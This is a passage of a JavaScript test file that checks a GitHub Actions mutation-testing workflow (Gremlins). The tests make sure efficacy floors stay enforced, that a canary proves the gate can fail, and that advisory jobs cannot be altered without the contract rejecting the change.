    "          declare -A group_present=()",
    "          missing_groups=()",
    "          missing_headline_rows=()",
    "          missing_mutator_rows=()",
    "",
    "          while IFS='|' read -r group package; do",
    '            [ -n "${group}" ] || continue',
    '            if [ -z "${group_present[${group}]:-}" ]; then',
    '              if compgen -G "rows/mutation-advisory-${group}-*/mutation-advisory-headline.txt" >/dev/null; then',
    '                group_present[${group}]="yes"',
    "              else",
    '                group_present[${group}]="no"',
    '                missing_groups+=("${group}")',
    "              fi",
    "            fi",
    '            if [ "${group_present[${group}]}" = "no" ]; then',
    '              missing_headline_rows+=("| \\`${package}\\` | missing (leg produced no artifact) | | | | |")',
    '              missing_mutator_rows+=("| \\`${package}\\` | missing | missing | missing | missing | missing | missing |")',
    "            fi",
    '          done <<<"${ADVISORY_GROUP_PACKAGES}"',
    "",
    "          # PW-6.8: each present leg's headline rows already carry killed and",
    "          # lived per package (this job never re-runs Gremlins); this sums",
    "          # them per group and compares the sum's efficacy on the 6 extra",
    "          # mutators against the floor measured in run 33901506579. A miss is",
    "          # a ::warning::, never a failing exit: this job stays advisory the",
    "          # same way the legs above do, and the missing-group check below is",
    "          # the only thing in this job allowed to fail it.",
    "          while IFS='|' read -r group floor; do",
    '            [ -n "${group}" ] || continue',
    '            [ "${group_present[${group}]:-no}" = "yes" ] || continue',
    "            killed_sum=0",
    "            lived_sum=0",
    "            while IFS='|' read -r _ _ killed lived _ _; do",
    '              killed="${killed// /}"',
    '              lived="${lived// /}"',
    "              case \"${killed}\" in ''|*[!0-9]*) continue ;; esac",
    "              case \"${lived}\" in ''|*[!0-9]*) continue ;; esac",
    "              killed_sum=$((killed_sum + killed))",
    "              lived_sum=$((lived_sum + lived))",
    "            done < <(sed 's/^|//;s/|$//' rows/mutation-advisory-\"${group}\"-*/mutation-advisory-headline.txt)",
    "            total=$((killed_sum + lived_sum))",
    '            if [ "${total}" -gt 0 ]; then',
    '              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"',
    '              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then',
    '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"',
    "              fi",
    "            fi",
    '          done <<<"${ADVISORY_GROUP_FLOORS}"',
    "",
    "          {",
    '            echo "### Mutation advisory: Gremlins\' default-disabled mutators"',
    '            echo ""',
    '            echo "Advisory. These numbers gate nothing. Each leg runs ONLY the 6"',
    '            echo "mutator types Gremlins disables by default; the gating matrix above"',
    '            echo "already measures the 5 it enables, so efficacy here is efficacy"',
    '            echo "against those 6 extra mutators alone, not against the gating floor."',
    '            echo ""',
    '            echo "| Package | Extra mutants | Killed | Lived | Not covered | Efficacy on extra mutators |"',
    '            echo "|---|---|---|---|---|---|"',
    "            cat rows/*/mutation-advisory-headline.txt 2>/dev/null || true",
    '            if [ "${#missing_headline_rows[@]}" -gt 0 ]; then',
    "              printf '%s\\n' \"${missing_headline_rows[@]}\"",
    "            fi",
    '            echo ""',
    '            echo "Mutants discovered per advisory mutator type:"',
    '            echo ""',
    '            echo "| Package | invert-logical | invert-bitwise | invert-bwassign | invert-assignments | invert-loopctrl | remove-self-assignments |"',
    '            echo "|---|---|---|---|---|---|---|"',
    "            cat rows/*/mutation-advisory-mutators.txt 2>/dev/null || true",
    '            if [ "${#missing_mutator_rows[@]}" -gt 0 ]; then',
    "              printf '%s\\n' \"${missing_mutator_rows[@]}\"",
    "            fi",
    '          } >>"$GITHUB_STEP_SUMMARY"',
    "",
    "          # A missing group is the same green-means-nothing failure PW-6.1",
    "          # was about: this job runs nothing but the download and the render,",
    "          # so failing it here is safe and is the only place left that can",
    "          # notice a leg never uploaded.",
    '          if [ "${#missing_groups[@]}" -gt 0 ]; then',
    '            echo "::error::advisory legs produced no artifact for group(s): ${missing_groups[*]}" >&2',
    "            exit 1",
    "          fi",
  ];
  const summaryStepLines = stepBlockLines(
    summary,
    "Combine and publish the advisory table",
    "the advisory summary job must have a 'Combine and publish the advisory table' step",
  );

  // A step count is cheap, exact, and independent of stepBlockLines' own
  // by-name pin above: an appended step counts as a `      - ` list item
  // under `steps:` whether or not it carries a `- name:` key at all, so an
  // anonymous `- run:` item spliced in after the pinned step (where the
  // by-name pin's own "no next step" fallback would otherwise fold it
  // straight into the pinned step's own line count) trips this with its
  // own message first. The decoy-shadow check above still fires first for
  // a same-named decoy, since that throws inside stepBlockLines itself
  // before this line is ever reached.
  const stepCount = (summary.match(/^ {6}- /gmu) ?? []).length;
  assert.ok(
    stepCount === 3,
    `the advisory summary job must have exactly 3 steps, found ${stepCount}`,
  );

  assert.ok(
    summaryStepLines.length === expectedSummaryStepLines.length,
    `the advisory summary job's "Combine and publish the advisory table" step must have exactly ${expectedSummaryStepLines.length} lines, found ${summaryStepLines.length}`,
  );
  for (const [i, actualLine] of summaryStepLines.entries()) {
    assert.ok(
      actualLine === expectedSummaryStepLines[i],
      `the advisory summary job's "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line ${i + 1} must be ${JSON.stringify(expectedSummaryStepLines[i])}, found ${JSON.stringify(actualLine)}`,
    );
  }

  // Defense in depth alongside the whole-step pin above: even if a rewrite
  // somehow left this step's own line count and text alone, a second copy
  // of the floor-compare loop spliced in anywhere else in the workflow
  // would still get a vote no test here is watching for. The header is
  // distinctive enough (no other loop in this file reads a bare
  // "group|floor" pair) that "exactly once in the whole file" is a cheap,
  // independent guard against that.
  const floorLoopHeaderMatches =
    source.match(/^ {10}while IFS='\|' read -r group floor; do$/gmu) ?? [];
  assert.ok(
    floorLoopHeaderMatches.length === 1,
    `the floor-compare loop header must appear exactly once in the workflow, found ${floorLoopHeaderMatches.length}`,
  );
}

// PW-2.5. The mutation-survivors record script (scripts/ci/mutation-survivors-record.sh)
// needs the same name|package set the gating matrix declares, duplicated
// here for the same reason ADVISORY_GROUP_PACKAGES is duplicated in the
// advisory summary job above: the history job runs after the matrix and has
// no access to its context. A package added to the matrix without a
// matching MUTATION_PACKAGES line would silently record "missing" forever
// instead of failing this check.
function assertMutationSurvivorsRecordStep(source, entries) {
  const history = jobBlock(source, "history", "the history job is missing");

  const envMatch = history.match(/^ {10}MUTATION_PACKAGES: \|\n((?: {12}.+\n)+)/mu);
  assert.ok(envMatch, "the history job must declare MUTATION_PACKAGES");
  const declaredPairs = envMatch[1]
    .split("\n")
    .filter((line) => line.length > 0)
    .map((line) => line.slice("            ".length));
  const expectedPairs = entries.map((entry) => `${entry.name}|${entry.package}`);
  if (JSON.stringify(declaredPairs) !== JSON.stringify(expectedPairs)) {
    throw new Error(
      "the history job's MUTATION_PACKAGES must match the gating matrix's own name|package set exactly",
    );
  }

  assert.match(
    history,
    /scripts\/ci\/mutation-survivors-record\.sh records advisory \. mutation-packages\.txt/u,
    "the history job must run the survivor identity record script over both artifact downloads",
  );
}

// Gremlins reads .gremlins.yaml from the Go module root and the working
// directory. One at the repo root would change the mutator set every gating job
// measures against, invalidating all 16 floors without touching the workflow.
// That is why the advisory mutators are command-line flags on one job.
function assertNoRootGremlinsConfig(exists) {
  for (const name of [".gremlins.yaml", ".gremlins.yml"]) {
    if (exists(name)) {
      throw new Error(`a repo-root ${name} would change every gating floor's mutator set`);
    }
  }
}

function escapeForRegExp(value) {
  return value.replaceAll(/[.*+?^${}()|[\]\\]/gu, "\\$&");
}

// Ends only at the next top-level job key, never at a bare 2-space comment:
// a "  # note" line planted INSIDE this job's own step list used to match
// the comment branch of the old regex and truncate the slice right there,
// so a step appended after that comment ran in CI but was invisible to
// every assertion below, including the exact-once step-name check. Every
// job in this file is followed by that next job's own leading doc-comment
// block (2-space `#` lines) before its key, so trimming still has to
// happen -- just from the true END of the slice only, popping trailing
// blank/comment lines one at a time, never scanning into the middle. An
// injected comment with real step content after it is real content sitting
// before that trailing run, so the loop below stops at it and the content
// stays in the slice.
function jobBlock(source, jobName, missingMessage) {
  const start = source.indexOf(`  ${jobName}:\n`);
  assert.notEqual(start, -1, missingMessage);
  const rest = source.slice(start + 1);
  const next = rest.search(/^ {2}[a-z][a-z0-9-]*:/mu);
  const end = next === -1 ? source.length : start + 1 + next;
  const lines = source.slice(start, end).split("\n");
  while (
    lines.length > 0 &&
    (lines[lines.length - 1] === "" || /^ {2}#/u.test(lines[lines.length - 1]))
  ) {
    lines.pop();
  }
  return `${lines.join("\n")}\n`;
}

// PW-6.1: a gate nobody proves can fail is the defect being fixed. The canary
// job runs the real binary and asserts both directions, so a future change
// that neuters the gate turns this workflow red instead of quietly green.
function assertCanaryJob(source) {
  const canary = canaryJob(source);
  assert.doesNotMatch(canary, /^ {4}continue-on-error:/mu, "the canary must block");
  assert.doesNotMatch(canary, /^ {8}continue-on-error:/mu, "the canary must block");
  assert.match(
    canary,
    /^ {10}if \.\/scripts\/ci\/mutation-gate\.sh canary-report\.json 101 101; then$/mu,
    "the canary must assert an unreachable floor is rejected",
  );
  assert.match(
    canary,
    /^ {10}\.\/scripts\/ci\/mutation-gate\.sh canary-report\.json 0 0$/mu,
    "the canary must assert a reachable floor is still accepted",
  );
  assert.match(
    canary,
    /^ {10}if \.\/scripts\/ci\/mutation-gate\.sh no-such-report\.json 0 0; then$/mu,
    "the canary must assert a missing report is rejected",
  );
  assert.match(
    canary,
    /^ {12}--timeout-coefficient 40 \\$/mu,
    "the canary runs pool, so it needs pool's timeout coefficient",
  );
}

function canaryJob(source) {
  const start = source.indexOf("  gate-canary:\n");
  assert.notEqual(start, -1, "the mutation gate canary job is missing");
  return source.slice(start);
}

function mutationRunStep(source) {
  const start = source.indexOf("      - name: Run Gremlins mutation testing");
  const end = source.indexOf("\n      - name: ", start + 1);
  assert.notEqual(start, -1, "Gremlins step is missing");
  assert.notEqual(end, -1, "Gremlins step boundary is missing");
  return source.slice(start, end);
}

const matrixEfficacy = "$" + "{{ matrix.efficacy }}";
const matrixMcover = "$" + "{{ matrix.mcover }}";
const matrixZeroMutants = "$" + "{{ matrix.zero_mutants || false }}";
const advisoryMutants = "$" + "{advisory_mutants}";
const advisoryFlagsExpansion = "$" + "{advisory_flags[@]}";
const coefficientArgsExpansion = "$" + '{coefficient_args[@]+"$' + '{coefficient_args[@]}"}';
const expressionTrue = "$" + "{{ true }}";
const matrixGroup = "$" + "{{ matrix.group }}";
const githubRunId = "$" + "{{ github.run_id }}";
const advisoryReportVar = "$" + "{report}";
const advisoryNameVar = "$" + "{name}";
const advisoryPackageVar = "$" + "{package}";
const missingGroupsCount = "$" + "{#missing_groups[@]}";
const missingGroupsList = "$" + "{missing_groups[*]}";
const advisoryMutantCountVar = "$" + "{mutant_count}";
const killedPlusLived = "$" + "((killed + lived))";
const killedPlusLivedPlusNotCovered = "$" + "((killed + lived + not_covered))";
const advisoryUnmeasuredGuard = `if [ "${advisoryMutantCountVar}" -gt 0 ] && [ "${killedPlusLived}" -eq 0 ]; then`;

function assertMutationFailure(source, expectedMessage, expectedPackages) {
  assert.throws(
    () => assertMutationWorkflow(source, expectedPackages),
    (error) => {
      assert.equal(error.message, expectedMessage);
      return true;
    },
  );
}

test("mutation workflow covers production packages with numeric ratchets", () => {
  assertMutationWorkflow(workflow);
});

test("mutation contract rejects a missing package", () => {
  assertMutationFailure(
    workflow.replace("./internal/pool", "./internal/missing"),
    "every real production package must appear exactly once",
  );
});

test("mutation contract rejects an undiscovered production package", () => {
  assertMutationFailure(workflow, "every real production package must appear exactly once", [
    ...productionPackagePaths(),
    "internal/future",
  ]);
});

test("mutation contract rejects a missing numeric floor", () => {
  assertMutationFailure(
    workflow.replace("            efficacy: 88.58\n", ""),
    "auth is missing efficacy",
  );
});

test("mutation contract rejects a weakened numeric floor", () => {
  assertMutationFailure(
    workflow.replace("            efficacy: 88.58\n", "            efficacy: 0\n"),
    "auth efficacy floor is weakened",
  );
});

test("mutation contract rejects swallowed Gremlins failures", () => {
  assertMutationFailure(
    workflow.replace("set -euo pipefail", "set -e"),
    "the report pipeline must preserve Gremlins failures",
  );
});

for (const value of ["true", expressionTrue]) {
  test(`mutation contract rejects step-level continue-on-error: ${value}`, () => {
    // Anchored on the step's name line alone, not on the name plus whatever
    // key currently follows it. The step gained an `id:` for PW-5.5, and a
    // two-line anchor turned into a no-op replace: the unmodified workflow
    // then passed the contract, assert.throws saw no exception, and the
    // failure read as "the contract stopped rejecting continue-on-error"
    // rather than "the fixture stopped being built".
    const source = workflow.replace(
      "      - name: Run Gremlins mutation testing\n",
      `      - name: Run Gremlins mutation testing\n        continue-on-error: ${value}\n`,
    );
    assertMutationFailure(source, "Gremlins failures must not be ignored at step level");
  });
}

test("mutation contract rejects a duplicate command package", () => {
  const source = workflow.replace(
    "          # internal/banner/gen is generator-only and has no mutation target.",
    "          - name: portwing-duplicate\n            package: ./cmd/portwing\n            efficacy: 100\n            mcover: 100\n          # internal/banner/gen is generator-only and has no mutation target.",
  );
  assertMutationFailure(source, "every real production package must appear exactly once");
});

test("mutation contract rejects a machine-readable report the gate cannot read", () => {
  const source = workflow.replace(
    "              --output mutation-report.json \\\n",
    "              # --output mutation-report.json \\\n",
  );
  assertMutationFailure(source, "Gremlins executable unleash command is malformed");
});

test("mutation contract rejects a shell separator before the package argument", () => {
  const source = workflow.replace(
    '            gremlins unleash --tags="" \\\n',
    '            gremlins unleash --tags="" \\\n              ; printf "%s\\n" \\\n',
  );
  assertMutationFailure(source, "Gremlins executable unleash command is malformed");
});

// PW-6.1's actual defect: Gremlins' own --threshold-efficacy/--threshold-mcover
// exit 0 no matter what the package measured, so a workflow that passes them
// and nothing else is not gating. These four tests are what "the gate can
// never fail" looks like from the config side.
test("mutation contract rejects a commented-out gate invocation", () => {
  const source = workflow.replace(
    `            ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}"`,
    `            # ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}"`,
  );
  assertMutationFailure(
    source,
    "the mutation floors must be enforced by scripts/ci/mutation-gate.sh",
  );
});

test("mutation contract rejects a gate invocation whose status is swallowed", () => {
  const source = workflow.replace(
    `            ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}"`,
    `            ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}" || true`,
  );
  assertMutationFailure(
    source,
    "the mutation floors must be enforced by scripts/ci/mutation-gate.sh",
  );
});

test("mutation contract rejects a gate invocation moved to a later step", () => {
  const source = workflow
    .replace(
      `            ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}"\n`,
      "",
    )
    .replace(
      "      - name: Summarize\n        if: always()",
      `      - name: Summarize\n        run: ./scripts/ci/mutation-gate.sh mutation-report.json "${matrixEfficacy}" "${matrixMcover}"\n        if: always()`,
    );
  assertMutationFailure(
    source,
    "the mutation floors must be enforced by scripts/ci/mutation-gate.sh",
  );
});

test("mutation contract rejects threshold flags inserted into the unleash command", () => {
  const source = workflow.replace(
    "              --output mutation-report.json \\\n",
    `              --output mutation-report.json \\\n              --threshold-efficacy "${matrixEfficacy}" \\\n              --threshold-mcover "${matrixMcover}" \\\n`,
  );
  assertMutationFailure(source, "Gremlins executable unleash command is malformed");
});

test("mutation contract rejects a return to Gremlins' inert threshold flags", () => {
  const source = workflow.replace(
    `          if [ "${matrixZeroMutants}" = "true" ]; then`,
    `          gremlins_args+=(--threshold-efficacy "${matrixEfficacy}")\n` +
      `          gremlins_args+=(--threshold-mcover "${matrixMcover}")\n` +
      `          if [ "${matrixZeroMutants}" = "true" ]; then`,
  );
  assertMutationFailure(source, "Gremlins' own threshold flags are inert and must not be trusted");
});

test("mutation contract rejects a dropped pool timeout coefficient", () => {
  const source = workflow.replace("            timeout_coefficient: 40\n", "");
  assertMutationFailure(source, "pool needs its timeout coefficient");
});

test("mutation contract rejects a dropped protocol timeout coefficient", () => {
  const source = workflow.replace(
    "            timeout_coefficient: 40\n            efficacy: 100\n",
    "            efficacy: 100\n",
  );
  assertMutationFailure(source, "protocol needs its timeout coefficient");
});

test("mutation contract rejects a canary that can flake on the timeout cliff", () => {
  const source = workflow.replace("            --timeout-coefficient 40 \\\n", "");
  assertMutationFailure(source, "the canary runs pool, so it needs pool's timeout coefficient");
});

test("mutation contract rejects a missing canary job", () => {
  const source = workflow.replace("  gate-canary:\n", "  gate-canary-disabled:\n");
  assertMutationFailure(source, "the mutation gate canary job is missing");
});

test("mutation contract rejects a canary that never proves the gate can fail", () => {
  const source = workflow.replace(
    "          if ./scripts/ci/mutation-gate.sh canary-report.json 101 101; then",
    "          if ./scripts/ci/mutation-gate.sh canary-report.json 0 0; then",
  );
  assertMutationFailure(source, "the canary must assert an unreachable floor is rejected");
});

test("mutation contract rejects a non-blocking canary", () => {
  const source = workflow.replace(
    "      - name: Prove the mutation gate still fails below a floor\n        shell: bash",
    "      - name: Prove the mutation gate still fails below a floor\n        continue-on-error: true\n        shell: bash",
  );
  assertMutationFailure(source, "the canary must block");
});

test("mutation contract rejects a dead zero-mutant branch decoy", () => {
  const source = workflow.replace(
    `          if [ "${matrixZeroMutants}" = "true" ]; then`,
    "          if false; then",
  );
  assertMutationFailure(source, "Gremlins script must preserve the zero-mutant branch");
});

test("mutation contract rejects an outer dead wrapper", () => {
  const source = workflow
    .replace(
      `          if [ "${matrixZeroMutants}" = "true" ]; then`,
      `          if false; then
            if [ "${matrixZeroMutants}" = "true" ]; then`,
    )
    .replace("          fi\n        env:", "          fi\n          fi\n        env:");
  assertMutationFailure(source, "Gremlins script must preserve the zero-mutant branch");
});

// PW-6.8. The advisory job is only worth having if it stays advisory and stays
// separate: a gate call in it would block on unratcheted mutators, and an
// advisory flag in the matrix would drop every floor measured without it.
test("mutation contract rejects a missing advisory job", () => {
  assertMutationFailure(
    workflow.replace("  mutation-advisory:\n", "  mutation-advisory-disabled:\n"),
    "the advisory mutator job is missing",
  );
});

test("mutation contract rejects an advisory job that gates", () => {
  const source = workflow.replace(
    `          echo "advisory: ${advisoryMutants} mutants came from the default-disabled mutators"`,
    "          ./scripts/ci/mutation-gate.sh mutation-advisory-auth.json 79.17 97.96",
  );
  assertMutationFailure(
    source,
    "the advisory job must not call the gate, or it stops being advisory",
  );
});

test("mutation contract rejects a dropped advisory mutator", () => {
  assertMutationFailure(
    workflow.replace("            --invert-logical\n", ""),
    "the advisory job must enable --invert-logical",
  );
});

test("mutation contract rejects a default mutator left enabled in the advisory job", () => {
  assertMutationFailure(
    workflow.replace("            --arithmetic-base=false\n", ""),
    "the advisory job must disable --arithmetic-base=false",
  );
});

test("mutation contract rejects an advisory mutator in the gating run", () => {
  const source = workflow.replace(
    `          if [ "${matrixZeroMutants}" = "true" ]; then`,
    `          gremlins_args+=(--invert-logical)\n          if [ "${matrixZeroMutants}" = "true" ]; then`,
  );
  assertMutationFailure(
    source,
    "--invert-logical would invalidate every floor measured without it",
  );
});

test("mutation contract rejects an advisory job that drops the flags expansion", () => {
  const source = workflow.replace(
    `            if ! gremlins unleash --tags="" \\\n              "${advisoryFlagsExpansion}" \\\n`,
    '            if ! gremlins unleash --tags="" \\\n',
  );
  assertMutationFailure(
    source,
    "the advisory job must expand advisory_flags and default_mutator_flags on the unleash invocation",
  );
});

test("mutation contract rejects continue-on-error on the advisory step", () => {
  const source = workflow.replace(
    "      - name: Measure the default-disabled mutators\n        shell: bash",
    "      - name: Measure the default-disabled mutators\n        continue-on-error: true\n        shell: bash",
  );
  assertMutationFailure(source, "continue-on-error must not appear anywhere in the advisory job");
});

test("mutation contract rejects an advisory floor that drifts from the matrix", () => {
  assertMutationFailure(
    workflow.replace("./internal/auth|auth|88.58", "./internal/auth|auth|88.57"),
    "auth's advisory row must carry the efficacy floor the matrix measured",
  );
});

// PW-6.8: the leg-wide floor on the 6 extra mutators, distinct from the
// per-package gating floor checked above. Missing and weakened get their own
// tests because the two failures read differently to whoever is debugging a
// broken contract.
test("mutation contract rejects an advisory group missing its leg-wide floor", () => {
  assertMutationFailure(
    workflow.replace(
      "          - group: server\n            # PW-6.8: measured 95.77% efficacy on the 6 extra mutators in run\n            # 33901506579 (2026-09-04): killed 68, lived 3 across\n            # ./internal/server. Floor is floor(measured) - 2pp of slack.\n            floor: 93\n",
      "          - group: server\n",
    ),
    "server is missing its advisory floor",
  );
});

test("mutation contract rejects a weakened leg-wide advisory floor", () => {
  assertMutationFailure(
    workflow.replace("            floor: 93\n", "            floor: 0\n"),
    "server advisory floor is weakened",
  );
});

test("mutation contract rejects an ADVISORY_GROUP_FLOORS that drifts from the matrix", () => {
  assertMutationFailure(
    workflow.replace("            server|93\n", "            server|94\n"),
    "the advisory summary job's ADVISORY_GROUP_FLOORS must match the advisory matrix's own floors exactly",
  );
});

test("mutation contract rejects a missing ADVISORY_GROUP_FLOORS declaration", () => {
  assertMutationFailure(
    workflow.replace(
      "          ADVISORY_GROUP_FLOORS: |\n",
      "          ADVISORY_GROUP_FLOORS_RENAMED: |\n",
    ),
    "the advisory summary job must declare ADVISORY_GROUP_FLOORS",
  );
});

test("mutation contract rejects an advisory summary job that never warns on a floor miss", () => {
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      "",
    ),
    "the advisory summary job must warn when a leg's efficacy is below its measured floor",
  );
});

test("mutation contract rejects an advisory summary job that gates on the leg-wide floor", () => {
  assertMutationFailure(
    workflow.replace(
      '          done <<<"${ADVISORY_GROUP_FLOORS}"\n',
      '          done <<<"${ADVISORY_GROUP_FLOORS}"\n\n          ./scripts/ci/mutation-gate.sh mutation-advisory-auth.json 79.17 97.96\n',
    ),
    "the advisory summary job must not call the gate, or it stops being advisory",
  );
});

test("mutation contract rejects a hard exit inserted after the advisory floor warning", () => {
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n                exit 1\n',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects a stray command inserted after the advisory floor warning", () => {
  // A deny-list of exit/return 1/false wouldn't catch this: `[ 1 -eq 0 ]` is
  // none of those, but it's still a statement that shouldn't be there.
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n                [ 1 -eq 0 ]\n',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects a rewrite appended to the same line as the advisory floor warning", () => {
  // Checking only the lines AFTER the warning line would miss this: `exit 1`
  // tacked onto the end of the warning's own echo statement, sharing its
  // line, so line count doesn't change and there is no separate "line
  // after the warning" for a tail-only check to reject -- only an exact
  // per-line comparison catches the warning's own line changing shape.
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"; exit 1\n',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 92 must be "                echo \\"::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%\\"", found "                echo \\"::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%\\"; exit 1"',
  );
});

test("mutation contract rejects a hard exit inserted before the advisory floor warning", () => {
  // Neither a deny-list nor a tail-only allow-list ever inspects anything
  // BEFORE the warning line: a bare exit 1 immediately above the echo
  // statement makes a floor miss a hard failure and passed both older
  // checks. Only pinning the whole loop body catches it.
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      '                exit 1\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects a line-continuation rewrite of the advisory floor warning", () => {
  // A trailing `\` merges the warning's echo with the next physical line at
  // the shell level, but the test reads physical lines: the warning line
  // itself now ends in a literal backslash instead of the closing quote,
  // and an extra physical line appears carrying the injected statement.
  assertMutationFailure(
    workflow.replace(
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%" \\\n                ; exit 1\n',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects the floor-compare loop wrapped in a dead conditional", () => {
  // A region check anchored to the loop's own start/end pattern still
  // matches when the whole loop is wrapped in `if false; then ... fi`: the
  // anchor text is untouched, only its reachability changed. Pinning the
  // step's entire run: script catches the two inserted lines even though
  // neither one touches the loop's own text.
  assertMutationFailure(
    workflow.replace(
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
      '          if false; then\n          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          fi',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 131',
  );
});

test("mutation contract rejects a duplicated floor-compare loop whose second copy is altered", () => {
  // A region check built on `String.match()` returns the FIRST match: a
  // live, correct copy of the loop followed by a second, altered copy
  // (here, the warning replaced with a no-op `true`) still matches the
  // first, correct copy and passes, leaving the second copy free to run
  // whatever it wants. The whole-step pin has no "first match wins" blind
  // spot because it compares every line the step actually contains.
  assertMutationFailure(
    workflow.replace(
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
